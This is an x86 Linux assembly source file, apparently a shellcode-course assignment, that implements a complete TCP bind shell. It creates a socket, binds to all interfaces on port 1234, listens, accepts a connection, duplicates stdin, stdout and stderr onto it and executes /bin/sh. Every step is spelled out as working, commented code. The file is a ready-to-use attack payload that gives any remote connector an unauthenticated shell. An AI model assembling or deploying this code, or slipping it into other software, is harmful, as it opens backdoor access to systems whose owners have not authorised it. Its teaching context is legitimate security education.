; SLAE Assignment 1
; bindshell.nasm
; Nelis SLAE-1327

global _start

section .text

	_start:

;------------------------------------------------------------------------------------------------------------------------
; setup socket()
; #define __NR_socketcall 102 (/usr/include/i386-linux-gnu/asm/unistd_32.h) / 102 = al => 0x66
; #define SYS_SOCKET 1	/* sys_socket(2) */ (usr/include/linux/net.h) bl => 0x01
    	    xor eax, eax        ; Empty eax register
	    mov al, 0x66        ; Set system call socketcall
	    xor ebx, ebx        ; Empty ebx register
	    mov bl, 0x01        ; Call determines which socket function to invoke. In this case its function 1, sys_socket
; int socket(int domain, int type, int protocol);
;   domain = AF_INET (=IPV4) = 2
;   type =  SOCK_STREAM = 1
;   protocol = The only available protocol here = 0 => xor esi, esi AND push esi
	    xor esi, esi 	; Empty esi register
	    push esi	        ; Push socket args in reverse order to stack 
	    push 0x01       
	    push 0x02
	    mov ecx, esp        ; Save pointer

	    int 0x80            ; Make the syscall

	    xor edi, edi	; Empty any data in edi
	    xchg edi, eax       ; Save return value from eax (socket file descriptor) to edi. Will need later
;------------------------------------------------------------------------------------------------------------------------
; setup bind() 
; #define __NR_socketcall 102 (/usr/include/i386-linux-gnu/asm/unistd_32.h) / 102 = al => 0x66
; #define SYS_BIND 2/ * sys_bind(2)*/ (usr/include/linux/net.h) bl => 0x02
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; sockfd = edi, since we just saved that one
	    xor eax, eax	; Empty eax register
	    mov al, 0x66	; Set system call socketcall
            xor ebx, ebx 	; Empty ebx register
            mov bl, 0x2		; Call determines which socket function to invoke. In this case its function 2, bind
; struct sockaddr:
;     sockfd = edi (see final step in socket()
;     addr = 0 0xd204 2 (reverse byte port 1234 via https://hexed.it/)
;     addrlen =  0x10 (addrlen = 16 bits)
	    xor ecx, ecx	; Empty ecx register
            push ecx		; Push the any (0.0.0.0)address
            push word 0xd204    ; Push port 1234 in reverse byte order. !! Port is configurable by changing the port nr here.!!
            push word 0x02      ; Push sin_family = 2 (AF_INET)
            mov ecx, esp        ; Save pointer
; bind() arguments:
            push 0x10           ; Push size of addr (16 bytes)
            push ecx            ; Push the pointer to sockaddr
            push edi            ; Push the file descriptor
            mov ecx, esp	; Save pointer

            int 0x80            ; Make the syscall

;------------------------------------------------------------------------------------------------------------------------             
; setup listen ()
; #define __NR_socketcall 102 (/usr/include/i386-linux-gnu/asm/unistd_32.h) / 102 = al => 0x66
; #define SYS_LISTEN 4/ * sys_listen(2)*/ (usr/include/linux/net.h) bl => 0x04
; int listen(int sockfd, int backlog)
	    xor eax, eax	; Empty eax register	
            mov al, 0x66	; set systemcall socketcall	
	    xor ebx, ebx	; Emtpty ebx register
            mov bl, 0x4         ; Call determines which socket function to invoke. In this case its function 4, listen

            xor ecx, ecx	; Empty ecx register
	    push ecx		; Set backlog = 0 (The backlog argument defines the maximum length to which the queue of pending connections for sockfd may grow)
            push edi		; Push socket file descriptor
            mov ecx, esp        ; Save pointer
            int 0x80            ; Make the syscall

;------------------------------------------------------------------------------------------------------------------------
; setup accept ()
; #define __NR_socketcall 102 (/usr/include/i386-linux-gnu/asm/unistd_32.h) / 102 = al => 0x66
; #define SYS_ACCEPT 5 /* sys_accept(2)*/ (usr/include/linux/net.h) bl => 0x05
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	    xor eax, eax	; Empty eax register
            mov al, 0x66	; Set systemcall socketcall
	    xor ebx, ebx	; Empty ebx register
            mov bl, 0x5         ; Call determines which socket function to invoke. In this case its function 5, accept

            xor ecx, ecx	; Empty ecx register
            push ecx		; addrlen (not needed, see man 2 accept) = NULL
            push ecx		; addr (not needen, see man 2 accept) = NULL
            push edi            ; Push socket file descriptor
            mov ecx, esp        ; Save pointer
            int 0x80            ; Make the syscall

            xchg ebx, eax       ; Save descriptor for accepted socket to ebx

;------------------------------------------------------------------------------------------------------------------------
;setup dup2()
; #define __NR_dup2 63 (/usr/include/i386-linux-gnu/asm/unistd_32.h)  / 63 = al => 0x3f
; copy file descriptors STDIN, STDOUT, STDERR via dup2
; int dup2(int oldfd, int newfd);
            xor ecx, ecx        ; Clear ecx register
            mov cl, 0x2         ; =2 (counter)
     dup2loop:
      	    mov al, 0x3f        ; Set systemcall dup2
            int 0x80		; Make the syscall
            dec ecx             ; ecx -1
            jns dup2loop	; jump not signed
                                        
;------------------------------------------------------------------------------------------------------------------------
;setup execve()
; #define __NR_execve 11 (/usr/include/i386-linux-gnu/asm/unistd_32.h)  / 11 = al => 0x0b
; int execve(const char *filename, char *const argv[],char *const envp[]);

	    xor eax, eax	; Empty eax register
	    mov al, 0x0b        ; Set systemcall execve
            xor ecx, ecx	; Empty ecx register
            push ecx            ; Push terminating null byte on the stack
            push 0x68732f2f	; Push filename on stack (hs//)
            push 0x6e69622f	; Push filename on stack (nib/)
            mov ebx, esp        ; Save pointer to encoded /bin//sh
            xor edx, edx	; Empty edx register (envp = NULL)
            int 0x80		; Make the syscall
